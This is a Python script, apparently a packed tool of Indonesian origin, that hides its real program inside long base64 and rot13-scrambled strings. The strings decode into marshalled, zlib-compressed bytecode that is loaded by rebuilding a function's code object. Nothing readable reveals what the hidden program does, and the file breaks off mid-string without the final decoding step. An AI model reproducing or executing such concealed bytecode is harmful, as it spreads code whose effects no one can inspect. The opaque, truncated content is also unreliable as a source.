# Kalo Mau Recode Izin Dulu Bos!
import base64, codecs
magic = 'Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBlKF8uX19jb2RlX18pO18uX19jb2RlX189Y29kZSgwLDAsMCwwLDEwLDY0LGInelx4MTZlXHgwMGVceDAxZFx4MDBceDgzXHgwMVx4YTBceDAyZVx4MDFkXHgwMVx4ODNceDAxXHhhMFx4MDNlXHgwMWRceDAyXHg4M1x4MDFceGEwXHgwNGRceDAzXHhhMVx4MDFceGExXHgwMVx4YTFceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwZFx4MDRTXHgwMFx4MDRceDAwZVx4MDV5L1x4MDFceDAwWlx4MDZceDAxXHgwMHpccmVceDA3ZVx4MDhlXHgwNlx4ODNceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwWVx4MDBkXHgwNFpceDA2W1x4MDZkXHgwNFNceDAwZFx4MDRaXHgwNltceDA2d1x4MDF3XHgwMCcsKCdtYXJzaGFsJywgJ3psaWInLCAnYmFzZTY0JywgYidlSnk5ZkFsNEhNbDFYbmZQZ2NIZ0dvQWdTUEFBbXlBSmNraGlEbHdFQ0lJa0NJSmNpQ1NHUzRCTDdleFMyTVpVQTJpZzUyQjFEd0cwQnF1MXVaSVQyOVN1ck4xSWxzblBBMFZTUGlweVpPVlRZc1ZSb2tSTzR0aVI3MXdlTzdHOWNpS3Y3Y1NLRmZsVHh2NnN2RmQ5VE04QTVITHR0VUZPZFZWMWRYVjFkYjMzL3IvcVZYK1RxL256d3U4OC9MNnpGd0xDRVY3bGtwek15MXhSSU1JbWY0L25JVytHcTMva2VSdUxUMnU5RXNkOXM3YVdvRldMTnV5cDFNS09mSkpuUnlFcHNLTW42V0ZIYjlMTGpyNmtqeDM5U1Q4Y0JiVXVIVWdHZUx6V285YW5nOGtnaTN2VmhuUmpzcEhGZlJCdlNqYXh1Rjl0VGpjbm0xbThUbTFKaDVJaEZnK29yZW0yWkJ1TDE2czcwdTNKZGhZUHFqdlRIY2tPbmx2a2tydElRM0szRVlJbjdTU05tM3h5ajd5WE5KSG1lMEp4bjd4bmVmOG1QUGt0TG5QRXk4bGQ2ei9DYzhrRFBHZDB5aDF5aUxUSW9uemdIbDg4dU1uOUJQZFFJQ0hTU3RydWU3Q3Y1TzU3SEY3M1BEeFQ4c0FMQnpJKzg3aktyM0pHUlBZWEQ1RWRXRE83YS9zbXY3dy9lVmoyRlkrUW5WRG40WHY4cHBEc2tYc3VjcmM3a2tkSkIrUWR2Y2ZmNWVqUFFOdDJrZDJzYlVjSjE4bVJ6bDBjMW5QbjAvWHdjOXI1TzA5czU1Nm5heWZaQzIxcXZNY2xqNUY5WlArclhESk11c2dCT0I0bklqa0l4eE9rbXh5QzQwbHltQnlCWXkvcElVZmhHQ0hIU0JpT1VYS2NuSUJqN0RKSFRwTGVWem5TZTA5SXhrbUVSQ0czVCs0bnNSWGhkWjUreXJndCs1Y0hpb01rdnNtVFBwWTN4ZnFvMyttamdVMis2Tm5reUdBbmx4d2lRL0JFUTlnalVQSzBmTUo4Qmh5ZjdIbFBrZUd0VDhqT1BtMmRSTzU3MmpxeHYxL24xMy9jNnZFOTIvYjROdGZhUFk1MXVQb2NVdUVSVThUQ2ZLbHRkb25LRXJtZXphcVRhM0lxcjJjcDVMWk1aRE1aT2FVcjJjd2twU3lyRHJLMHJDcEQxSGVaWnZNNWlBUnlxcVF2WkdrYU02OUxHVm5GeUt3MHo0cDVaNm5NaXVlb2t0SHp2NHpTKzhKOFZpWGlJcHpJeEcrLzllYm4zbnJ6amJmZWZQMnROejhoaWs3MHJUZSs4Tllicjd6MXh1dHZ2ZkdqV3lKZk1PTzFGWDBNL2tNTm44TnFQZ2JCR3c5WTBVK3lDRno1bWJmZStFRXIrOHRRVCszbGo5NTY4MVBzNWcreEFpdktpcjdCTHYreTZFcDgwa29IamRVbFhjOXBwNk5SS2FkRWNqUzd0cTZscUpTVEk2bHNPbnEzTDNxT3luZnlzcWFQRVVXRHJsckhJb3FzOWNCUno2YXk2cGlXVGExb0F6MjZrcGF6ZVgwc0hzTy9ubFEybjlIcCtwaWtxajJhcHJLamxNbG0xdE9Lem5MTG9ZdVNMa1d2bTlWRjlEVzl4SytXRzh5SG9qS0ozemJhemNTNnJLcloxZHZYYnlUZVB6VTVVMjVnbWF0THNxUVBQQkpLUGwzUlZibmswL1IxVlRZNmFWcnNwUXNpcS91bUpsTnBVYzdvV0x0eDFIN1F2SjJ0UlpSc2xFb1prazJmVXhWbzJGaDhNQll6OXJFYXg3cVBSWTZmQzNlZlpZY3pVZW5zbWFoT3pob04xN0tHb3FwU2REQVNLN2R0Y3g5Qk9sSGlnMFpIVmVOdnpremVHTDg4T1QwcmdUcmxYRldJeDY0cW1memFxRGllSVRTckVESGVOeXBlVjlaa1ZSeVV4QXQ1UlNYUm1ldng4VWhmUEI2UHdRV3gvbEZ4OVc1WUhNL2xWUG1XUEg5RjBhT0QvYWNpL1VQaXNTdlB6RjY3ZWxKVWxSVlp2Q3luVnJKaDhUbVphaUFCMFFHNDFjUVN6YWJsNk1oUUpCWVpHQm9haUl6MGlkZXk4NG9xaXpQU2drUVZ1NktwaktaTGkxUktpMzF4TEJ5TDlNVWk4ZjVUVGlPUDljZWoyTkNCdmhqSkthTmlQRFljVyt1RHYxSHhjamE3cU1yUlJYYW9QTXFvT0MvUmVWbXZIT1hNM00yWlViRy9mL2hVWC8vQWNGODQ1YmFSUHN0T1RxQ2QvQWowbWM0VmVjS2pWdElGM2FON2lVQTh4SXZhWW9QVGZicW5BRGFRK080THFEMk1qMkFPOFpNNnV3eGM1Uy9Xa2NBbXY4RVgwTWJXZjFnQXV4QUVhekhKeWpaVXJ0WUR4WHEwY2J4NXp5WVdDMXE2akFNOTFLdzNGSGhtYVQ2cU54YWJTSXVaM2hTS3pTUUVkeEQwRnRSa1lIOUNCWUZkM2JyY1JuWVVoSi9nU1B0RGo3NERXckR6Z1VBNjdndkZkdENzdXpxNURROWNzOXU2eG54S2JGVm53VVAyZEhMRm5aYUczT3Q2bm81S2kxaFpzRDZ1czY3MmVqbDkxL3JYZVc3RGk1cVhsZTJDRm50Qjg5cjFibk1sYUY2NDRtVXZlMklXUTgwYlBqQmQ4cVZVV2FMbGZWVURmT0xHK01RVmNXcDZabmI4OG8zeGE3UVozaHR0Z2VBUlQxdmhZSHpKVVZmcm9DSnVMMG1nWk1TMHBPVlhwSXlZeW1aWEZGbFVuSEdYa3pSZHdUTXJVam92cHVYTTRtSStJMkdHdEpMUGlIbytQUytwSXFpWS9JcW9aaGVWakJWUFFiVlluRWc1U1hmVnZDSkRkV0oxRTE2b1VxQ1hKMmVyVDk4dVY0dncxUFNseEkxcjR6TlQrU2c4VDlXMW9xMVdYN0h2ZDdxNkx2RnRRSG9jMkJFUDNNYTRYSDJTUFNKN05xSkE4NWZZWTh2aU9talQvTHdzYW9wcTVxbktrcVREbzRONVV5UTFzeTU5NjVlK2dYK0I4OGFSTmJMWW04M0pHZEZXY3V6cXlMd2N6Y2RQSlo5ZG5OSDZwZWVOQnFMTm9mYWJVOGlZMGVwS01CMDMramFJR1ZkdWNYU2FRbENoMFViTVBXSlhyRVNjdDhSTUJKaU42TjA0VTZwYXRPeVBLcG1GYlBTUlVBNWlUaTlUaXlXLzJTdVB3QUtEMmlaUXN1VEYwOWE5SnRoWnBqeFBWbmVOSnF0U0doNmFRTEhNb25oYXJPcjJVdjFDWGxYbk1sSmFyckVWdHlhdlRpU3VUZHJWTVhPeTdZZ2pNTElnTlM5bllFUzNWZFZ4ZWZ6eStGWGFoTzl0ZDBuSWFpVy90cTdwY3BxaWFxSjFFSlQ4OHhKQURFcFJVWlhxVWlhNEtQbVVUQzZ2bDd4b0VjRXVxYktjSzNubE5VVXZlVFNkbGdRcVExVWdRYW1sa204UlVVakppNit1NUZ1bGlpNlhBcGJCMVVxZVJWa3YxVHZtcXVSZDFySlFEQm9uMDVKL0lZdk5MTlZQcnFYa0hLS2NzQy9abW1CL3pBUW5ZaGpCTEN1UndCQ2lrQlV6U3lSaVZWbDJFY3hoV1dZNllWMmVlTVRSTVh4U2dTeGlLMERxRHFGMjdrWlZ6YmZ4SVY2QU1BakhHTi9JOS9BRC9FbStTMmlHWStBVjRmdjBIQlNyVXZIWWF5RmJ4VDhIWTg5NFZRZG9Sd1JRZ3Z3bUIycGRLSG9JcVBvQ3g1U3JqM2hSZmFNaVh3Umk4MmtlVlMxVDhnRlNUNElGSHRScncwTVBhVVJpUWxwTW9rRjJrSGF5azNROGFObndGQVNrQlErRURTK3ErRTN1dGZFTlg4RzNIRFRWN0gxaHc4OVNld3RlU08rNzc5bW9ZK245MXRrQXFFMXZ3Yi9jd0ZUL1MwejFIMkNxdWhsVlpxYTFOZ2ZWcnhmKzNmUFlxbmhyVHB6VE5sYmhDdnozdkZ0bHQ2eC9IbFIyUFZQWkliMlZpSER2ZWxEWmJaYktQb2kwd2xMWk8xd3F1LzdsZWt0bFE0eXA3TVBUOUFpK05wNGFJVTNXRUE0NElrK1J5SWJyOHFpcG53RlVsaFV2b0tCOSt5Yy9lVCsvaStVcFpzNTRUaEt2U0dDNzhkeEg4N3ZoM0pRQmF2ZTZCS3BxSmtXVm5BNGFDVS8rUUI1ZjZqVXBvNE80MmJWOU10OE9tUUQyVUcra1pXcWYrTXdiK1oxd1lrWUNPUmV2Z0JTcXpwbFA1TkZ1VElsWHMzZGw4ZmxzWG56cjRXZis1Q3V2bFQzSG84ZkxyWXVHa2pzSjRyc0E2RjArS2M3VGNyT2M2YjA1YzFMT2pONFppMFZHeWdjbFFFaEtTa0xSaUs3MXJxNnU5aUxNNzgxVFZjNmtza1FteHVlVXhUa0NmWEZwdUgvazRrZ3MxanM0T1RIUk85QS8wdGQ3WVdMOFl1L2d4SVdMZy9GTEYwYjYrb1pIeFRTVWZINWlTVjEvZHZ6cStQZ3p1YjdyaVVTdVQ3MHkxNXRTeGkrcjEwWkZxQzVEVS9OajhWRXhwZEVGUGJzaVo4WnVEU3hveWZURThzM2xTMmx0NlAzcEsybz'
love = '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'
god = 'Tkx0cVVtU21hQmxQUmo1ZDh1WWtmYW5rbDljVVRkZE1CUnl0MXRFVmZmeVNvMndkekI3MjJFdm5scjUwMGQ0S2huZW0zaDF5dkEwMnI2Tm10NkkxMC9xWUtqVnByam50anRQdlFjRHFJYjZMandpVlk0ZDdqZjN2MXlwWTNxMWdYOEZlN3RRNW5VY1Y2NXBBeFhWMkgxTVJYbENEZmhielY2bUR1dlZ6b0E0NHBnN3dlckRadUNxUHEraE1IUVRjVS9VdWRjQzl6Rm5xQUdKTUhkUlBHNVBWWTFyUDQ1U09xTW56SU80U3ZGaVo0RXdJUXEwbEtaZlhIRitONnNuWW1pbVhpNU5YSjJjbmEreTM4VDYzUDJERnowVHM2UkZyUFFWTmI1ZmFNNjdKRzRjVGhvUGJtdXZLL0V4MG00SENtMHRBMXJEWWR2V2w1RitSY2VydkFiNnNaallDOXJuTjUyZHEzeTcrSWNKRXdkVnd4TW9jT3BBbkJYeS9yM0pKaGlUaHlFd29ISDNvS3dGSFB4cFFPTmFSaGhrdTNNaFFSQlhaQzdxSHpSSjZxUU5JbmVNV3dZck84U3hFbUFwRDZENnptTXRlMjBxVEFMUFRtRk1QT1FEam1GM0dkQ09rbSt3MEREUG1vckZwcDhCS2t6Wm1tY0VtZ3UzQ0dReFdWdmVEaGR5SnJoNUE4enJBb24zSCtBaEF4bnAwNVlBeW5iWU5LamFRUGVaTUNkaW1mZmY1MTY0andBV2dPN25oWGVRMkFGNkNIZHdQbHBidjVEYjhUcW9MVW5XRk9rZ2RzTTRGOUpaQzRCNVk2QldlYnR5NVhmQVZRM0FlVjFvT2JqSnZQalBIaVFWSXQrbGRicVVPV1NsUHNRM3d5UTY5cWVBditEYWhWKzdjZHErV1pBSnhUdnNwOTBvSmU2ckRjSGR1V1dDdyt3aUw4L2NZTVFCcjNVNk9Wa05pZTJWbC9VOGRWeEdzNDVqZXdWeEZkbG5DR1hiMVUvdVRYRVdnaDQ4enorN1BHei84VkgwOFkvWHhNMy8xUG9hN3hWL243N1Q4TmZ0NWQ2V2ZzYmFxbnE2UFE1NldlbS82K25WKy9kRjcwOXVzUDArdy91ekVjbmcyZkhLYThreE5WeW0zYTVPemlZdVRKbUtpZndmMXhkL0Y0SWN4K0JFSVp1bVBJcVN4VEd4cVhRSUx5L0JQT1ZqSm9SL0ZpcXRudzY1TVRreGVINThkbjZhdlkxMGZ3eEs3elNrcWNjdDBZTkk3Y3pWeGkzNGNVWmYzMHZqTUxIMlRzeW5UMzhQZ0UzajVlcTBMSDlQbU9ackYxVEFUR2JDWmZHZkNmMGtoK1J4T1E2RHZoSmlUTldrVndCU2I4amZSZzl1ZjB3UVliTHJmTENIVEZUa2ppVGo3d1ZiRG1QSi9HN1hpMjRkTXZkdUFqR3cxQytXb1p0STRkSG9xOCtZaUdIMC9QbzRuM3RlZjlESHZHK05BalhuSzZwSnEzVGU3SXA0V2piYWdPeStWdzd4cS84TVpNRVl6NDFOaElSblE4dlBNbjV5QlR0ZTg0cWRzR3hYZVU2cFRzOW1ja2xrcytkaGFFa0JFZ0U0TXlOQ2Z4S0NJUVExNnFURSsrTUNNSnBaOFdrNVZkSE9DWk1NQ0ZqbFZTc2xKUDdRbHJlZ2xyd1p0M001SWxid0xrbWFTU3ViWUVIT21RaHhuUWpjWnROMEVZMjVnWTdQSWlpK2hUU3hqTHM4RG01RTZzLzR1andpSGo4YnNPOXJ6Tks0VkJHZnUwMjZYN1ZsaExTVFVtdGJBM0p5U1VmUzVPWVJJR2pKNlA0Ly8zQkRMQkZob2RCdmg2TFZnVnlPdU13aEJGbS9uaGYrNzcvdER6YlpKRGdxMXBac2hacGZ1Z05KZFVOcGVkMmozR0MybWJFWHMxbFJORUdIY2IxdGRmSmZtdXNOREFXMnZ6aS9EY1ptenZTZnVtYXNPM2djQ2VqNFUvUkQzZDdKVkNDaGRCeVhyN0JVSVNBZFlPdWlrNjFtNndVa0hJWTFsTUQ5SUdoOTRRQk0xVFpmUFA1WFQ3Nm84UHdmaXZhQ284aHp6L2oxblQ3RnZQKzN5UEFZNDBaOE15V1JSbnJQbWJjamMvRG9JQU03Y0pCdGNKNUw3V0NLN21wRXBPanFoVzYycVpPUzV0RXdVS2V4aHN3cHN0cTFVang0OENucjBoaHRLbmp4VjMySEczZ3VRTzFlNW5uNFpCNzVRR2RMMmpFZWlNZ3lkVWJkbGFoQWZuYVpCSmZ3bXZqNWM2V3RrNjFFaE5ndGloS3czN3hUYjh1cDk5cXZYT1J0d1ZWNDZRQ0xoQVFJdWMxN1F5MTZiRDg3NWlLK1RLL29SZkczQ01BQWtEa2RyQ1BoY3I5K0hyNStWYTJEbjJSQ3dYN3Z6eW8zUmQzamxVb3E5SVMwS25hK3pWNCtQTTRldVh0SEtPMDdXTzduSnh0eFNGdDVXSnArZUJ5N1A5ektGU3g4eFZTV25KVVV0QmVZVnFpOFJhYjNNUjhPZWtvL3hPL3JQc05qUE1sVkUvd25HYTk0bG14ajdweGo4SXd5K2lrSGxHc0d0RTZ3WDZmaFN4Unc5c1VWTjZCS3dkU0NldjJ1L1JEOHZNaEZ2eDVkb2k2OWRLdVYxdmNNMitMWGI3L0NyY09aMXdYaGZ3WE1SanJjN043d0FoemgwTE5MNW9yQUplYS81Tm56c0xYc0EwSGpoTFhnMitXWGZocCs1T2duQXIvek02N21lUUw3cGlWeHNxTUJzUlBEb2I2dzM0MHpwUGVhMGhNdC9BTEJNNzJjL0NRRUxhQ1Z0RDFvWVRNSWx5UjF3UlN0T2VtM2lWcFNPZ3BlQm5WMFBQTkNLTm9CNm5jVWRWcDE3cXV2YzVCVnNhVHUwWWllMkZINEl1dG9aRFBSdUJNaCthRzlnMldkdERIeVJkRUhKRG9SRVp0cVlMbkRGM2JnWlpxTytVRi8wSWhCa1I5RTZIdHprUFI3QnN4SGNhTmhvTkk2UzdtSW5PVVFPdjhyWjlSVDNiSElYMFErYzMyaUN1dllXbXB5NmpsaDE5RmpIbzFaZHpSc3RHNkZiWEtZWllOdSs5Vjh6d1I4NTlxSjE1bmt1QXlBTXp1L0E4L3IrQldIOW0xYVo4SXRXUzZDTTF3YU5laGR1MUNRbjd3c2JyWVhXNGdIU2l4dDZIc0l6UVR6Qyt0S0VyWGd1V2dnNjUyS0ZCaWNlTHpSV2xlc3JORHZuK2dzdFRueWdFSUkzTkdqTnhZdUZWb1NUME9NSGk5MXNHOUVRdXg4N1d4RGdmWjJ5M3hmcjcwdjFWWTVaQUlGL2s1VVpoaktIYXEvZlV2Ym55RWpWMi94VFkvZTdlWHZRbysxMmp3Sll2djhPZlhxYWpMNFhmYnBOWHgxK1RGK2RxZXFyMzk3eS9CT3N6TlAxVlM4WmMvV1ZRUDI2U002U2MrUThXeXM1VXV3aDQzaGRKbEI5NVIzdkZvSWlhSjF1Z25JSE5JS1hXejVLUEtmQU9Nd2RoWG92NkFIOUdHNDBZNFJsQXA3d0tCd3ZRaDZNQzVZM3llS0hXZnpTdy9xcWRsdzJ0MmdqeWJDYzhERDNHZFlyWERGYzRBdEN3WU1FM0hUQ0MwOU5HeE9QZHd4d3pBRGJCaEk5QitvK0pjK2xWRWtEd3piSE1udVcxREU1WXh4blFLQWJYWi9UQ2lHcXZDcFJtZmtJZEtOblN4NDNXcjY0ZWlMY0hUMXI0dkxXclI3dTlZRGdjU3ZSV0t3c25JdlRUNks2dm9UQlJkVFpRalpEMjJ5Y1lmd1F1aVpFbC9TMGVySnFBd0RtbkZpcnpVMnI1bTZCazBvYTZvOUtkNVVGS3dxbUxXZm41aktMSjQ5SGo3T2l3MVVWYU1waVJpYTk4bG9Lck1HaVBIcDNiTDdmckpGT29SME1aS0RLUlVtWGt3R1NUZVhSWjVxaWZRaTNsTHpQQUZneG1sSVNZUDVlZEttZ1diVWNRcy94MUZKdlh1cE5zNTJaUnFmbCs0WCs0WElxVDJYYkxWeWpDWHpvYWV5emVrMjZLL2N5ZjJzUk02OWdNSVBCRGV3VGx6ODZRalA2TEo2NWpzRTF2THJ6MFBWYkYrZWN2WHR6RjI0a2JzMU0zamdkTzgyNHFJcXJOTjlQN1RwV0Q2VHBkTmlUM0xITnkyU0xaS1ZHT1pPYXk4RWdBTHBGU2w0Y1ArVUdjNE13REtNUGJ0QUdLRFg3eU1Nd0lEcGlzYzIveVJiY2ViSTZSd0ZUVURtbGE4YlJKU292akhVL2Z2eWRnOEdsa0c0aldOa2xVWVBqeXNLb1dEV241YkVnRm5iTGR4Qis0anpXN2VZWGhRM2NzY21oWUJGdUZ3Y3g0UjYvaS91WWNFZVk0Ujd4Wlg3c0VjOG9Fa0FUSVZKeDduYThNZXcxc3BqajJiUVZIUWJQcUlxbVE4dHpaNytIOTBlOGQ1Z3pEbGg0QWdsWjVJeWFUVW1xZGpaU0tWdURhcURqdm9KeEo0QU1mTVJLVU81dXVwcTRQRFV0enR5Y21KaWNtUkczK1RPcFB2cCtsQnRzcEE0VXR0eGd2emd6WVMweFlxTFJXZlptS1FkbFl5cGd6c1pqaktFNWpJVnd0OTRpTUdSVldsTHdITjJCZCtNTGJHcXp4RXZHaVhkNndTQlBxZ3AzbGFQbnlrZXNaNm9zUm16N1dEZ1JRbjhjeDN1RHl6L2l1NGo1bTF4TEM2NDFsdTFuSHZwRmdxNjRsZFhkdDVGMWYxZXMxT09zeHJpV2E5akVCdjNuK0p3K01idHl1aGNPcVJ3Y21xcGJpU3ZGM3pKSFpNZjU4SEZ6M2JiaW8zZk9BYmxzV1hpYlhReHNSMFhKbjgrQnVNdjBCY3g1a1hOem0xS1F6UUFnUjlLQS9Fc1pvb0J5WVJMblo5eERwNytJWlQvQW1ic1djVkpjS3dVV1pYMk9LQ21kL2d6bWU1ZXpTcWJrVT